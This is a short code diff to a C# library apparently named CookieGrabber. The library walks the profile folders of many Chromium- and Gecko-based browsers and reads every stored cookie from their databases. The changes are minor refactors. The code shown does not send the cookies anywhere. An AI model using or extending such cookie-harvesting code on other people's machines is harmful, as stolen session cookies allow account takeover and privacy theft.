@@ -16,7 +16,7 @@ namespace CookieGrabber
             ChromiumCookiePath = "\\Cookies",
             GeckoCookiePath = "\\cookies.sqlite";
 
-        public static string[] ChromiumBasedBrowserPaths = new string[]
+        public static readonly string[] ChromiumBasedBrowserPaths = new string[]
         {
             local + "Google\\Chrome" + ChromiumUserProfile,
             local + "Google(x86)\\Chrome" + ChromiumUserProfile,
@@ -44,7 +44,7 @@ namespace CookieGrabber
             local + "Yandex\\YandexBrowser" + ChromiumUserProfile
         };
 
-        private static string[] GeckoBasedBrowsersList = new string[]
+        public static readonly string[] GeckoBasedBrowsersList = new string[]
         {
             roaming + "Mozilla\\Firefox" + GeckoUserProfiles,
             roaming + "Waterfox" + GeckoUserProfiles,
@@ -68,7 +68,7 @@ namespace CookieGrabber
             {
                 if (!Directory.Exists(profiles))
                     continue;
-                foreach (var path in GetActiveProfiles(profiles))
+                foreach (var path in Directory.GetDirectories(profiles))
                 {
                     var cookiePath = path + GeckoCookiePath;
                     if (!File.Exists(cookiePath))
@@ -152,7 +152,8 @@ namespace CookieGrabber
 
         public static Cookie[] GetAllCookies(CookieSelector selector)
         {
-            return AddEnd(GetChromiumCookies(selector), GetGeckoCookies(selector));
+            var d = AddEnd(GetChromiumCookies(selector), GetGeckoCookies(selector));
+            return d;
         }
 
         public static Cookie[] GetAllCookies()
@@ -170,7 +171,7 @@ namespace CookieGrabber
 
         public static Cookie GetNewestCookieByKey(string name)
         {
-            return GetAllCookies((n, _, __, ___, ____, _____, ______) => n == name).OrderByDescending(cookie => cookie.CreatedAt).ElementAt(0);
+            return GetAllCookies((n, _, __, ___, ____, _____, ______) => n == name)?.OrderByDescending(cookie => cookie.CreatedAt).FirstOrDefault();
         }
         #endregion
 
@@ -194,11 +195,6 @@ namespace CookieGrabber
             // 9223372036854775807 => long.MaxValue
             // 13236437777840111 => true value
             return TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * (long)expiry), TimeZoneInfo.Local);
-        }
-
-        static string[] GetActiveProfiles(string path)
-        {
-            return Directory.GetDirectories(path).Where(str => File.Exists(str + "\\cookies.sqlite")).ToArray();
         }
         #endregion
     }
